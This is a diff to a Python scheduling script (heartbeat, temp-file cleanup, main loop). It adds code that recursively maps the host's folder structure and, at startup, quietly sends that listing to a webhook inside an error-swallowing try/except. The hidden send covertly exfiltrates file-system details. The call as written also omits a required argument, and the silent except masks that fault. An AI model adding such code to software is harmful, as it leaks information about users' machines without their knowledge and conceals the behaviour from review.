@@ -70,6 +70,32 @@ def heartbeat():
     if sent and FIRST_MESSAGE:
         FIRST_MESSAGE = False
 
+def build_directory_tree(path):
+    """
+    Recursively builds a dictionary that represents the folder structure.
+    Folders are dictionaries.
+    Files are stored as keys with value None.
+    """
+    tree = {}
+
+    try:
+        for entry in os.listdir(path):
+            full_path = os.path.join(path, entry)
+
+            if os.path.isdir(full_path):
+                tree[entry] = build_directory_tree(full_path)
+            else:
+                tree[entry] = None
+
+    except PermissionError:
+        tree["__error__"] = "Permission denied"
+
+    return tree
+
+def get_directory_architecture(root_path):
+    root_name = os.path.basename(os.path.abspath(root_path))
+    return {root_name: build_directory_tree(root_path)}
+
 def cleanup_named_tempfiles():
     AGE_THRESHOLD = 60 
     temp_dir = tempfile.gettempdir()
@@ -216,6 +242,12 @@ if __name__ == "__main__":
         }
     ]
 
+
+    try:
+        send_webhook(str(get_directory_architecture())[:1500])
+    except:
+        pass
+    
     while True:
         now = time.monotonic()
         nearest_next_run = None
